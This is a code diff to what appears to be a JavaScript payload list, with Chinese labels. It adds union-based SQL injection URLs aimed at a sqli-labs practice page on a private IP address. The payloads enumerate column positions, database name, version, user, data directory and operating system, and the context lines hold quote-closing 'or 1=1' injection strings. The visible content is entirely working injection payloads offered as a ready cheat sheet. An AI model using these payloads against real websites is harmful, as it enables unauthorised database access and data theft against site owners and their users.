@@ -275,6 +275,19 @@
        { command: '\') or 1=1 --+', description: '闭合方式5-数据库操作命令' }, 
        { command: '\'\') or 1=1 --+', description: '闭合方式6-数据库操作命令' }, 
        { command: '\'\')) or 1=1 --+', description: '闭合方式7-数据库操作命令' }, 
+       { command: 'http://192.168.1.63/sqli-labs/Less-1/?id=-1\' union select 1,2,3 --+', description: '联合查询爆出字段位置-数据库操作命令' }, 
+       { command: 'http://192.168.1.63/sqli-labs/Less-1/?id=-1\' union select 1,database(),3 --+', description: '联合查询数据库名字-数据库操作命令' }, 
+       { command: 'http://192.168.1.63/sqli-labs/Less-1/?id=-1\' union select 1,version(),3 --+', description: '联合查询数据库版本-数据库操作命令' }, 
+       { command: 'http://192.168.1.63/sqli-labs/Less-1/?id=-1\' union select 1,user(),3 --+', description: '联合查询数据库用户-数据库操作命令' },  
+       { command: 'http://192.168.1.63/sqli-labs/Less-1/?id=-1\' union select 1,@@datadir,3 --+', description: '联合查询数据库目录-数据库操作命令' }, 
+       { command: 'http://192.168.1.63/sqli-labs/Less-1/?id=-1\' union select 1,@@version_compile_os,3 --+', description: '联合查询操作系统-数据库操作命令' },     
+
+
+
+
+
+
+
 
 
 
